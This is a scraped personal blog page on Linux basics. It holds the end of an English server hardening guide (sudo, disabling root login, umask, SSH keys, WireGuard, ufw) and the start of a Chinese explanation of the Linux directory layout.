ALL=(ALL:ALL) ALL Make sure sudo works before moving on because you can lock yourself out of root if you’re not careful.\nWe don’t want to leave old unused accounts around. So if there’s a default account from your VM image, delete it:\n1 sudo userdel admin Disable root logins Now that we have an account with sudo privileges, there’s no reason anyone should log in with root. First, disable root at the console:\n1 sudo passwd -l root Now prevent root from logging in over SSH. Add (or uncomment) this line in /etc/ssh/sshd_config:\n1 PermitRootLogin no You will have to restart sshd for the change to take effect, but we’ll have a few more SSH config changes. If you’re anxious to do it now, run:\n1 sudo systemctl restart ssh umask We need to change the default umask, which controls the permissions on new files and directories. Most Linux distributions default umask to 022, which gives read access to every user. Run umask to see your current setting.\nWe want a umask of 077, which removes access to every user except the one who created the file. 027 would work, too (full access for the owner, read for group, and nothing for other). The point is that it’s safer to loosen file permissions when needed rather than tighten them.\nFor sh and bash, we can add umask to /etc/profile:\n1 sudo bash -c 'echo -e \"\\numask 077\" \u003e\u003e /etc/profile' If you use another shell, I will assume you know where to configure it.\nLog out and back in, then verify new files have the desired permissions:\n1 2 $ touch xyz ; ls -l xyz ; rm xyz -rw------- 1 alfred alfred 0 Mar 25 11:23 xyz SSH keys I know you, and I always use new, randomly generated passwords for every account, but most people don’t. Someday you may grant access to someone with bad password hygiene, so it’s best to start right and only allow logins by SSH key. Your cloud provider probably already configured an SSH key for you, but don’t skip this section because the default settings still need to be tweaked.\nIf you have an SSH key already that you want to use, then great. If not, and you’re on Linux or Mac, generate one:\n1 ssh-keygen -t rsa -b 4096 If you’re on Windows, PuTTYgen should work (but don’t ask me about it because I’ve never used it).\nBack on the server now. By default, SSH reads authorized keys from $HOME/.ssh/authorized_keys. The problem is that if an attacker finds an exploit that lets them write one file, you can be sure they’ll attempt to add a public key to $HOME/.ssh/authorized_keys. It’s safer if only root can add an SSH key.\nWe need a central place to keep public keys:\n1 2 sudo mkdir -p /etc/ssh/authorized_keys sudo chmod 0711 /etc/ssh/authorized_keys The permissions on the directory give root full access. Everyone else can read files but not create them or even get a directory listing.\nWe’ll create one file in this directory for each user with SSH access. If you already have an authorized_keys file, you can copy it into place:\n1 sudo cp ~alfred/.ssh/authorized_keys /etc/ssh/authorized_keys/alfred If not, paste the public key:\n1 sudo bash -c 'echo your public ssh key \u003e /etc/ssh/authorized_keys/alfred' The last step is to make the file readable by the user:\n1 sudo setfacl -m u:alfred:r /etc/ssh/authorized_keys/alfred If setfacl doesn’t exist, install it with sudo apt install acl.\nBefore continuing, make sure that your user can read their authorized_keys file:\n1 cat /etc/ssh/authorized/keys/$USER If you can’t read it now, SSH won’t be able to read it from your account either, and you’ll be locked out.\nNow configure SSH to read public keys from our central directory by adding this to /etc/ssh/sshd_config:\n1 AuthorizedKeysFile /etc/ssh/authorized_keys/%u While we’re editing sshd_config, we also want to disable password logins (this may already be set):\n1 PasswordAuthentication no Restart sshd for those changes to take effect:\n1 sudo systemctl restart ssh Don’t log out yet. But do log in from another terminal window to make sure it works.\nIf you have an old authorized_keys file, delete it: rm ~/.ssh/authorized_keys (it isn’t insecure, it’s just confusing to leave an unused file in place).\nWireGuard We’ve done the basics to lock down SSH. But, ideally, SSH would not be accessible from the Internet. You could use firewall rules to restrict access to specific IP addresses. But in my case, I have a dynamic IP, and I don’t want to run a bastion host, so that won’t work for me. Fortunately, WireGuard makes running a VPN easy.\nIf you haven’t heard of it, WireGuard is a peer-to-peer VPN. There isn’t a central server. On each host, you set the public keys of its authorized peers. It’s a little bit work to configure, but it works well.\nOne drawback to WireGuard is that the connection goes both ways. If your server is compromised, the attacker can reach any configured peer. Personally, I have the other side of the WireGuard tunnel in a local VM that blocks inbound connections from the tunnel.\nHowever you do it, I will assume you have some other host already configured with WireGuard. Before we get started, you’ll need:\nThe public key and private IP of the peer you want to connect from. The private IP to assign to the server. It should be in the same subnet as the peer. Start by installing WireGuard. It’s simple in Debian Bullseye and recent Ubuntu versions:\n1 sudo apt install wireguard Now generate a key pair:\n1 2 sudo mkdir -p /etc/wireguard sudo sh -c 'wg genkey | tee /etc/wireguard/private_key | wg pubkey \u003e /etc/wireguard/public_key' And create a config file in /etc/wireguard/wg0.conf:\n1 2 3 4 5 6 7 8 [Interface] Address = 192.168.50.2/24 PrivateKey = ListenPort = 12345 [Peer] PublicKey = u8Uo3ab+psKeOpciUIaNuBulNrOCXrU8GN3yD06/0WM= AllowedIPs = 192.168.50.1/32 You’ll need to set the address to an IP on the same subnet as the computer you’re accessing it from. Also, configure the correct AllowedIPs and PublicKey. You can copy/paste the PrivateKey, or use :r /etc/wireguard/private_key in VIM.\nSet ListenPort to any random ephemeral port number. You can generate one in Bash:\n1 echo $(($SRANDOM % 55535 + 10000)) The port number isn’t a secret per se, but WireGuard hides itself well, so we might as well prevent an attacker from knowing it.\nIf your cloud provider has a firewall, don’t forget to open WireGuard’s UDP port.\nNow start WireGuard:\n1 2 sudo systemctl start wg-quick@wg0 sudo systemctl enable wg-quick@wg0 Don’t forget to configure the server as a peer on the computer you’re connecting from. Make sure you can connect to SSH through the WireGuard IP.\nFirewall Your cloud provider probably has a firewall already. If you’re happy with that, allow WireGuard, block SSH, and call it a day. But if you don’t don’t like that firewall, you can install one on the server.\nOn Debian based systems, I use ufw. Install it with:\n1 sudo apt install ufw The first rule we need allows anyone to access the WireGuard port. Change $WG_PORT to whatever you configured in /etc/wireguard/wg0.conf:\n1 sudo ufw allow in on eth0 to any port $WG_PORT proto udp Also run ip a and make sure the interface you want to filter is actually eth0, sometimes it may not be.\nNow we want to allow SSH on WireGuard:\n1 sudo ufw allow in on wg0 to any port 22 proto tcp And add any other ports you want open:\n1 2 sudo ufw allow in on eth0 to any port 80 proto tcp sudo ufw allow in on eth0 to any port 443 proto tcp When your rules are in place, cross your fingers and turn on ufw:\n1 sudo ufw enable With any luck, SSH remains connected. Don’t log out until you confirm you can get a new SSH connection.\nNext steps There are a few more things you should consider:\nFind a process to keep your system up to date. Debian’s Automatic Update is one option, though you may want some oversight. Most attacks won’t be against what we’ve covered in this guide, but against the applications you install next. Properly done, containers can limit the impact. Finally, you should automate the job of initializing your host. With practice, this process can be done manually in about 30 minutes, but your automation will be a couple of minutes at most. Manually typing the commands is also error-prone, and a few steps can lock you out if you aren’t careful.\nIf you aren’t sure where to start with automation, I suggest you start simple. For example, write an init script that gets your host to a known state before Ansible (or a similar tool) takes over.\nIf you want to use an init script, I have published some scripts which do everything in this blog post, which you can use directly or as a base for what you really need.\n",
  "wordCount" : "36958",
  "inLanguage": "en",
  "datePublished": "2017-03-05T10:49:36Z",
  "dateModified": "2017-03-05T10:49:36Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://funny-toffee-4aa7c3.netlify.app/posts/%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80/linux/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Wjy's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://funny-toffee-4aa7c3.netlify.app/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://funny-toffee-4aa7c3.netlify.app/" accesskey="h" title="Wjy&#39;s Blog (Alt + H)">Wjy&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://funny-toffee-4aa7c3.netlify.app/" title="🏠主页">
                    <span>🏠主页</span>
                </a>
            </li>
            <li>
                <a href="https://funny-toffee-4aa7c3.netlify.app/posts" title="📚文章">
                    <span>📚文章</span>
                </a>
            </li>
            <li>
                <a href="https://funny-toffee-4aa7c3.netlify.app/archives/" title="⏱时间轴">
                    <span>⏱时间轴</span>
                </a>
            </li>
            <li>
                <a href="https://funny-toffee-4aa7c3.netlify.app/tags" title="🔖标签">
                    <span>🔖标签</span>
                </a>
            </li>
            <li>
                <a href="https://funny-toffee-4aa7c3.netlify.app/search" title="🔍搜索 (Alt &#43; /)" accesskey=/>
                    <span>🔍搜索</span>
                </a>
            </li>
            <li>
                <a href="https://funny-toffee-4aa7c3.netlify.app/about" title="🙋🏻‍♂️关于">
                    <span>🙋🏻‍♂️关于</span>
                </a>
            </li>
            <li>
                <a href="https://funny-toffee-4aa7c3.netlify.app/links" title="🤝友链">
                    <span>🤝友链</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://funny-toffee-4aa7c3.netlify.app/">Home</a>&nbsp;»&nbsp;<a href="https://funny-toffee-4aa7c3.netlify.app/posts/">Posts</a></div>
    <h1 class="post-title">
      linux
    </h1>
    <div class="post-meta"><span title='2017-03-05 10:49:36 +0000 UTC'>2017-03-05</span>

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#%e6%96%87%e4%bb%b6%e7%9b%ae%e5%bd%95%e8%a7%a3%e6%9e%90" aria-label="文件目录解析">文件目录解析</a></li>
                <li>
                    <a href="#%e7%b3%bb%e7%bb%9f%e8%a7%a3%e6%9e%90" aria-label="系统解析">系统解析</a><ul>
                        
                <li>
                    <a href="#%e5%bc%95%e5%af%bc%e8%bf%87%e7%a8%8b" aria-label="引导过程">引导过程</a></li>
                <li>
                    <a href="#%e5%bc%95%e5%af%bc%e7%ba%a7%e5%88%ab" aria-label="引导级别">引导级别</a></li></ul>
                </li>
                <li>
                    <a href="#%e5%91%bd%e4%bb%a4%e7%ae%a1%e7%90%86" aria-label="命令管理">命令管理</a><ul>
                        
                <li>
                    <a href="#%e5%91%bd%e4%bb%a4%e6%a0%bc%e5%bc%8f" aria-label="命令格式">命令格式</a></li>
                <li>
                    <a href="#%e6%96%87%e4%bb%b6%e5%92%8c%e7%9b%ae%e5%bd%95%e6%93%8d%e4%bd%9c" aria-label="文件和目录操作">文件和目录操作</a><ul>
                        
                <li>
                    <a href="#pwd" aria-label="pwd">pwd</a></li>
                <li>
                    <a href="#ls" aria-label="ls">ls</a></li>
                <li>
                    <a href="#ll" aria-label="ll">ll</a></li>
                <li>
                    <a href="#cd" aria-label="cd">cd</a></li>
                <li>
                    <a href="#locate" aria-label="locate">locate</a></li>
                <li>
                    <a href="#find" aria-label="find">find</a></li>
                <li>
                    <a href="#clear" aria-label="clear">clear</a></li>
                <li>
                    <a href="#cat" aria-label="cat">cat</a></li>
                <li>
                    <a href="#more" aria-label="more">more</a></li>
                <li>
                    <a href="#less" aria-label="less">less</a></li>
                <li>
                    <a href="#head" aria-label="head">head</a></li>
                <li>
                    <a href="#tail" aria-label="tail">tail</a></li>
                <li>
                    <a href="#grep" aria-label="grep">grep</a></li>
                <li>
                    <a href="#chmod" aria-label="chmod">chmod</a></li>
                <li>
                    <a href="#chown" aria-label="chown">chown</a></li>
                <li>
                    <a href="#cp" aria-label="cp">cp</a></li>
                <li>
                    <a href="#scp" aria-label="scp">scp</a></li>
                <li>
                    <a href="#mv" aria-label="mv">mv</a></li>
                <li>
                    <a href="#mkdir" aria-label="mkdir">mkdir</a></li>
                <li>
                    <a href="#rm" aria-label="rm">rm</a></li></ul>
                </li>
                <li>
                    <a href="#%e6%96%87%e4%bb%b6%e5%bd%92%e6%a1%a3%e5%92%8c%e5%8e%8b%e7%bc%a9" aria-label="文件归档和压缩">文件归档和压缩</a><ul>
                        
                <li>
                    <a href="#zip%e5%92%8cunzip" aria-label="zip和unzip">zip和unzip</a></li>
                <li>
                    <a href="#gzipgunzip" aria-label="gzip/gunzip">gzip/gunzip</a></li>
                <li>
                    <a href="#tar" aria-label="tar">tar</a></li></ul>
                </li>
                <li>
                    <a href="#%e7%b3%bb%e7%bb%9f%e7%ae%a1%e7%90%86" aria-label="系统管理">系统管理</a><ul>
                        
                <li>
                    <a href="#free" aria-label="free">free</a></li>
                <li>
                    <a href="#shutdown" aria-label="shutdown">shutdown</a></li>
                <li>
                    <a href="#reboot" aria-label="reboot">reboot</a></li>
                <li>
                    <a href="#date" aria-label="date">date</a></li>
                <li>
                    <a href="#cal" aria-label="cal">cal</a></li>
                <li>
                    <a href="#top" aria-label="top">top</a></li></ul>
                </li>
                <li>
                    <a href="#%e7%94%a8%e6%88%b7%e7%ae%a1%e7%90%86" aria-label="用户管理">用户管理</a><ul>
                        
                <li>
                    <a href="#groupadd" aria-label="groupadd">groupadd</a></li>
                <li>
                    <a href="#groupdel" aria-label="groupdel">groupdel</a></li>
                <li>
                    <a href="#groups" aria-label="groups">groups</a></li>
                <li>
                    <a href="#useradd" aria-label="useradd">useradd</a></li>
                <li>
                    <a href="#userdel" aria-label="userdel">userdel</a></li>
                <li>
                    <a href="#passwd" aria-label="passwd">passwd</a></li>
                <li>
                    <a href="#usermod" aria-label="usermod">usermod</a></li>
                <li>
                    <a href="#su" aria-label="su">su</a></li>
                <li>
                    <a href="#who" aria-label="who">who</a></li>
                <li>
                    <a href="#whoami" aria-label="whoami">whoami</a></li></ul>
                </li>
                <li>
                    <a href="#%e7%bd%91%e7%bb%9c%e7%ae%a1%e7%90%86" aria-label="网络管理">网络管理</a><ul>
                        
                <li>
                    <a href="#finger-%e9%9c%80%e8%a6%81%e5%ae%89%e8%a3%85" aria-label="finger (需要安装)">finger (需要安装)</a></li>
                <li>
                    <a href="#ftp" aria-label="ftp">ftp</a></li>
                <li>
                    <a href="#hostname" aria-label="hostname">hostname</a></li>
                <li>
                    <a href="#netstat" aria-label="netstat">netstat</a></li>
                <li>
                    <a href="#ping" aria-label="ping">ping</a></li>
                <li>
                    <a href="#ssh" aria-label="ssh">ssh</a></li>
                <li>
                    <a href="#telnet%e4%b8%8d%e5%bb%ba%e8%ae%ae%e4%bd%bf%e7%94%a8" aria-label="telnet(不建议使用)">telnet(不建议使用)</a></li>
                <li>
                    <a href="#wget" aria-label="wget">wget</a></li>
                <li>
                    <a href="#ifconfig" aria-label="ifconfig">ifconfig</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e6%9c%ac%e6%9c%baip" aria-label="查看本机ip">查看本机ip</a></li></ul>
                </li>
                <li>
                    <a href="#%e8%bf%9b%e7%a8%8b%e7%ae%a1%e7%90%86" aria-label="进程管理">进程管理</a><ul>
                        
                <li>
                    <a href="#ps" aria-label="ps">ps</a></li>
                <li>
                    <a href="#kill" aria-label="kill">kill</a></li></ul>
                </li>
                <li>
                    <a href="#%e6%9c%8d%e5%8a%a1%e7%ae%a1%e7%90%86" aria-label="服务管理">服务管理</a><ul>
                        
                <li>
                    <a href="#service" aria-label="service">service</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#%e5%b8%b8%e7%94%a8%e5%91%bd%e4%bb%a4%e5%ae%9e%e6%88%98" aria-label="常用命令实战">常用命令实战</a><ul>
                        
                <li>
                    <a href="#linux%e6%96%b0%e5%bb%ba%e7%bb%84%e7%94%a8%e6%88%b7%e8%b5%8b%e6%9d%83" aria-label="Linux新建组、用户、赋权">Linux新建组、用户、赋权</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e6%96%87%e4%bb%b6%e5%a4%b9%e5%a4%a7%e5%b0%8f" aria-label="查看文件夹大小">查看文件夹大小</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e7%ab%af%e5%8f%a3%e5%8d%a0%e7%94%a8%e6%83%85%e5%86%b5" aria-label="查看端口占用情况">查看端口占用情况</a></li>
                <li>
                    <a href="#linux-ssh%e5%a4%9a%e5%8f%b0%e4%b8%bb%e6%9c%ba%e5%85%8d%e5%af%86%e7%99%bb%e5%bd%95" aria-label="Linux ssh多台主机免密登录">Linux ssh多台主机免密登录</a></li>
                <li>
                    <a href="#%e6%9f%a5%e7%9c%8b%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%9a%84%e9%85%8d%e7%bd%ae" aria-label="查看服务器的配置">查看服务器的配置</a></li></ul>
                </li>
                <li>
                    <a href="#%e5%85%b6%e4%bb%96" aria-label="其他">其他</a><ul>
                        
                <li>
                    <a href="#%e8%a7%a3%e5%86%b3linux-buffercache%e5%86%85%e5%ad%98%e5%8d%a0%e7%94%a8%e8%bf%87%e9%ab%98" aria-label="解决Linux buffer/cache内存占用过高">解决Linux buffer/cache内存占用过高</a></li>
                <li>
                    <a href="#linux%e6%9f%a5%e7%9c%8b%e7%a1%ac%e7%9b%98%e4%bd%bf%e7%94%a8%e6%83%85%e5%86%b5" aria-label="linux查看硬盘使用情况">linux查看硬盘使用情况</a></li>
                <li>
                    <a href="#%e7%a3%81%e7%9b%98%e5%8d%a0%e7%94%a8%e8%bf%87%e5%a4%a7" aria-label="磁盘占用过大">磁盘占用过大</a></li>
                <li>
                    <a href="#centos7%e8%ae%be%e7%bd%ae%e5%ae%9a%e6%97%b6%e6%b8%85%e9%99%a4buffcache%e7%9a%84%e8%84%9a%e6%9c%ac" aria-label="Centos7设置定时清除buff/cache的脚本">Centos7设置定时清除buff/cache的脚本</a></li>
                <li>
                    <a href="#ubuntu%e4%b8%8b%e4%bd%bf%e7%94%a8filezilla%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6%e5%a4%b1%e8%b4%a5%e7%9a%84%e9%97%ae%e9%a2%98" aria-label="ubuntu下使用filezilla上传文件失败的问题">ubuntu下使用filezilla上传文件失败的问题</a></li>
                <li>
                    <a href="#apache%e4%b8%8b%e8%bd%bd%e6%96%87%e4%bb%b6" aria-label="apache下载文件">apache下载文件</a></li>
                <li>
                    <a href="#%e7%a3%81%e7%9b%98%e6%bb%a1%e4%ba%86" aria-label="磁盘满了">磁盘满了</a></li>
                <li>
                    <a href="#nohup-java--jar-xxxxjar-" aria-label="nohup java -jar xxxx.jar &amp;amp;">nohup java -jar xxxx.jar &amp;</a></li></ul>
                </li>
                <li>
                    <a href="#%e9%80%9a%e8%bf%87%e5%af%86%e9%92%a5%e7%99%bb%e9%99%86linux" aria-label="通过密钥登陆linux">通过密钥登陆linux</a><ul>
                        
                <li>
                    <a href="#%e5%88%b6%e4%bd%9c%e5%af%86%e9%92%a5%e5%af%b9" aria-label="制作密钥对">制作密钥对</a></li>
                <li>
                    <a href="#%e5%9c%a8%e6%9c%8d%e5%8a%a1%e5%99%a8%e4%b8%8a%e5%ae%89%e8%a3%85%e5%85%ac%e9%92%a5" aria-label="在服务器上安装公钥">在服务器上安装公钥</a></li>
                <li>
                    <a href="#%e8%ae%be%e7%bd%ae-ssh%e6%89%93%e5%bc%80%e5%af%86%e9%92%a5%e7%99%bb%e5%bd%95%e5%8a%9f%e8%83%bd" aria-label="设置 SSH，打开密钥登录功能">设置 SSH，打开密钥登录功能</a></li>
                <li>
                    <a href="#%e5%a4%8d%e5%88%b6%e7%a7%81%e9%92%a5id_rsa%e5%88%b0%e6%9c%ac%e5%9c%b0" aria-label="复制私钥id_rsa到本地">复制私钥<code>id_rsa</code>到本地</a></li>
                <li>
                    <a href="#%e7%99%bb%e5%bd%95" aria-label="登录">登录</a></li>
                <li>
                    <a href="#%e9%97%ae%e9%a2%98" aria-label="问题">问题</a></li></ul>
                </li>
                <li>
                    <a href="#%e9%98%bf%e9%87%8c%e4%ba%91%e5%8d%87%e7%ba%a7https" aria-label="阿里云升级https">阿里云升级https</a><ul>
                        
                <li>
                    <a href="#%e7%94%b3%e8%af%b7%e8%af%81%e4%b9%a6" aria-label="申请证书">申请证书</a></li></ul>
                </li>
                <li>
                    <a href="#linuxmint" aria-label="LinuxMint">LinuxMint</a><ul>
                        
                <li>
                    <a href="#gedit" aria-label="gedit">gedit</a></li>
                <li>
                    <a href="#jdk" aria-label="jdk">jdk</a></li>
                <li>
                    <a href="#node" aria-label="node">node</a></li>
                <li>
                    <a href="#snap" aria-label="snap">snap</a></li>
                <li>
                    <a href="#git" aria-label="git">git</a><ul>
                        
                <li>
                    <a href="#idea%e4%b8%ad%e9%85%8d%e7%bd%aegit" aria-label="idea中配置git">idea中配置git</a></li></ul>
                </li>
                <li>
                    <a href="#zookeeper" aria-label="zookeeper">zookeeper</a></li>
                <li>
                    <a href="#redis" aria-label="redis">redis</a></li>
                <li>
                    <a href="#postman" aria-label="postman">postman</a></li>
                <li>
                    <a href="#navicat" aria-label="navicat">navicat</a></li>
                <li>
                    <a href="#mysql" aria-label="mysql">mysql</a><ul>
                        
                <li>
                    <a href="#%e9%85%8d%e7%bd%ae%e8%bf%9c%e7%a8%8b%e8%bf%9e%e6%8e%a5" aria-label="配置远程连接">配置远程连接</a></li></ul>
                </li>
                <li>
                    <a href="#beyond-compare" aria-label="beyond compare">beyond compare</a></li>
                <li>
                    <a href="#xmind" aria-label="xmind">xmind</a></li>
                <li>
                    <a href="#%e5%ad%97%e4%bd%93" aria-label="字体">字体</a></li>
                <li>
                    <a href="#%e5%bf%ab%e6%8d%b7%e9%94%ae" aria-label="快捷键">快捷键</a></li>
                <li>
                    <a href="#vi%e6%a8%a1%e5%bc%8f%e4%b8%ad%e4%b8%8a%e4%b8%8b%e5%b7%a6%e5%8f%b3%e9%94%ae%e5%92%8c%e5%9b%9e%e9%80%80%e9%94%ae%e5%87%ba%e7%8e%b0%e5%ad%97%e6%af%8d" aria-label="VI模式中上下左右键和回退键出现字母">VI模式中上下左右键和回退键出现字母</a></li>
                <li>
                    <a href="#ctrlaltf12" aria-label="ctrl&#43;alt&#43;f12">ctrl+alt+f12</a></li>
                <li>
                    <a href="#%e4%b8%bb%e6%96%87%e4%bb%b6%e5%a4%b9%e7%9a%84%e4%b8%ad%e6%96%87%e6%96%87%e4%bb%b6%e5%a4%b9%e6%94%b9%e4%b8%ba%e8%8b%b1%e6%96%87" aria-label="主文件夹的中文文件夹改为英文">主文件夹的中文文件夹改为英文</a></li>
                <li>
                    <a href="#linuxmint%e5%bc%83%e5%9d%91" aria-label="LinuxMint弃坑">LinuxMint弃坑</a></li></ul>
                </li>
                <li>
                    <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" aria-label="环境搭建">环境搭建</a><ul>
                        
                <li>
                    <a href="#%e9%9c%80%e8%a6%81%e5%ae%89%e8%a3%85%e4%bb%80%e4%b9%88" aria-label="需要安装什么">需要安装什么</a></li>
                <li>
                    <a href="#jdk-1" aria-label="jdk">jdk</a><ul>
                        
                <li>
                    <a href="#%e6%99%ae%e9%80%9a%e6%96%b9%e5%bc%8f%e5%ae%89%e8%a3%85jdk" aria-label="普通方式安装JDK">普通方式安装JDK</a></li></ul>
                </li>
                <li>
                    <a href="#mysql-1" aria-label="mysql">mysql</a><ul>
                        
                <li>
                    <a href="#docker%e5%ae%89%e8%a3%85mysql" aria-label="docker安装mysql">docker安装mysql</a></li>
                <li>
                    <a href="#%e6%99%ae%e9%80%9a%e6%96%b9%e5%bc%8f%e5%ae%89%e8%a3%85" aria-label="普通方式安装">普通方式安装</a></li></ul>
                </li>
                <li>
                    <a href="#tomcat" aria-label="tomcat">tomcat</a><ul>
                        
                <li>
                    <a href="#wget-%e4%b8%8b%e8%bd%bd" aria-label="wget 下载">wget 下载</a></li></ul>
                </li>
                <li>
                    <a href="#git-1" aria-label="git">git</a></li>
                <li>
                    <a href="#maven" aria-label="maven">maven</a></li>
                <li>
                    <a href="#zookeeper-1" aria-label="zookeeper">zookeeper</a><ul>
                        
                <li>
                    <a href="#docker%e5%ae%89%e8%a3%85zookeeper" aria-label="docker安装zookeeper">docker安装zookeeper</a></li></ul>
                </li>
                <li>
                    <a href="#redis-1" aria-label="redis">redis</a><ul>
                        
                <li>
                    <a href="#%e5%81%9c%e6%ad%a2redis" aria-label="停止redis">停止redis</a></li>
                <li>
                    <a href="#%e7%bb%99redis%e6%b7%bb%e5%8a%a0%e5%af%86%e7%a0%81" aria-label="给redis添加密码">给redis添加密码</a></li>
                <li>
                    <a href="#%e9%85%8d%e7%bd%ae%e8%bf%9c%e7%a8%8b%e9%93%be%e6%8e%a5redis" aria-label="配置远程链接redis">配置远程链接redis</a></li>
                <li>
                    <a href="#docker%e5%ae%89%e8%a3%85redis" aria-label="docker安装redis">docker安装redis</a></li></ul>
                </li>
                <li>
                    <a href="#nginx" aria-label="nginx">nginx</a></li>
                <li>
                    <a href="#solr" aria-label="solr">solr</a><ul>
                        
                <li>
                    <a href="#%e5%88%9b%e5%bb%bacore" aria-label="创建core">创建core</a></li>
                <li>
                    <a href="#%e7%bb%99solr%e6%b7%bb%e5%8a%a0%e8%ae%bf%e9%97%ae%e5%af%86%e7%a0%81" aria-label="给solr添加访问密码">给solr添加访问密码</a></li></ul>
                </li>
                <li>
                    <a href="#freeswitch" aria-label="freeswitch">freeswitch</a></li></ul>
                </li>
                <li>
                    <a href="#linux%e6%9c%8d%e5%8a%a1%e5%99%a8%e5%8a%a0%e5%9b%ba%e6%8c%87%e5%8d%97" aria-label="linux服务器加固指南">linux服务器加固指南</a><ul>
                        
                <li>
                    <a href="#know-your-enemy" aria-label="Know your enemy">Know your enemy</a></li>
                <li>
                    <a href="#update-the-software" aria-label="Update the software">Update the software</a></li>
                <li>
                    <a href="#create-a-user-account" aria-label="Create a user account">Create a user account</a></li>
                <li>
                    <a href="#disable-root-logins" aria-label="Disable root logins">Disable root logins</a></li>
                <li>
                    <a href="#umask" aria-label="umask"><code>umask</code></a></li>
                <li>
                    <a href="#ssh-keys" aria-label="SSH keys">SSH keys</a></li>
                <li>
                    <a href="#wireguard" aria-label="WireGuard">WireGuard</a></li>
                <li>
                    <a href="#firewall" aria-label="Firewall">Firewall</a></li>
                <li>
                    <a href="#next-steps" aria-label="Next steps">Next steps</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="文件目录解析">文件目录解析<a hidden class="anchor" aria-hidden="true" href="#文件目录解析">#</a></h1>
<p><img loading="lazy" src="1.png" alt=""  />
</p>
<p>/：根目录，linux文件系统入口，是最高级、最重要的目录，衍生出其他目录，还和系统开机、还原、修复有直接关系。
一般不要把应用程序直接放在根目录下，如果满了，可能导致无法开机。还需要注意某些程序的日志文件是否在根目录下。</p>
<p>/bin：存放的是在单人维护模式下还能够被操作的指令，在/bin底下的指令可以被root与一般帐号所使用，主要有：cat,chmod, chown, date, mv, mkdir, cp, bash等等常用的指令。</p>
<p>/boot：存放内核和加载内核需要的文件，即启动系统需要的文件。</p>
<p>/dev：存放linux系统下的设备文件，访问该目录下某个文件，相当于访问某个设备，常用的是挂载光驱 mount /dev/cdrom /mnt。</p>
<p>/etc：系统配置文件存放的目录，不建议在此目录下存放可执行文件。
重要的配置文件有 /etc/inittab、/etc/fstab、/etc/init.d、/etc/X11、/etc/sysconfig、/etc/xinetd.d修改配置文件之前记得备份。</p>
<p>/home：系统默认的用户家目录，新增用户账号时，用户的家目录都存放在此目录下，~表示当前用户的家目录，~edu 表示用户 edu 的家目录。建议单独分区，并设置较大的磁盘空间，方便用户存放数据</p>
<p>/lib： /usr/lib： /usr/local/lib：&quot; ：系统使用的函数库的目录，程序在执行过程中，需要调用一些额外的参数时需要函数库的协助，比较重要的目录为 /lib/modules。</p>
<p>/media：放置的就是可移除的装置。 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：/media/floppy, /media/cdrom等等。</p>
<p>/mnt：临时文件系统的挂载点目录.以前和/media一样，但有专门/media后，专门做临时挂载</p>
<p>/opt：第三方软件的存放目录</p>
<p>/root：系统管理员(root)的家目录。 之所以放在这里，是因为如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录，所以我们会希望root的家目录与根目录放置在同一个分区中。</p>
<p>/sbin：基本的系统维护命令,只能由超级用户使用.这些命令为开机、修复、还原系统过程所需要的。常见的命令有fdisk,fsck,ifconfig,init,mkfs</p>
<p>/tmp：一般用户或正在执行的程序临时存放文件的目录,任何人都可以访问,重要数据不可放置在此目录下</p>
<p>/srv：服务启动之后需要访问的数据目录，如www服务需要访问的网页数据存放在/srv/www内。</p>
<p>/proc：是一个虚拟文件系统。放置内存中的数据，当有一个进程启动时，就有一个文件夹。
比较重要的/proc/meminfo,/proc/cpuinfo，可以通过这两文件查看内存和CPU情况，当然还有/proc/dma,/proc/interrupts,/proc/ioports,/proc/net/*等</p>
<p>/sys：和/proc相似，也是虚拟文件系统，主要记录内核相关，比如内核模块，内核检测的硬件信息。</p>
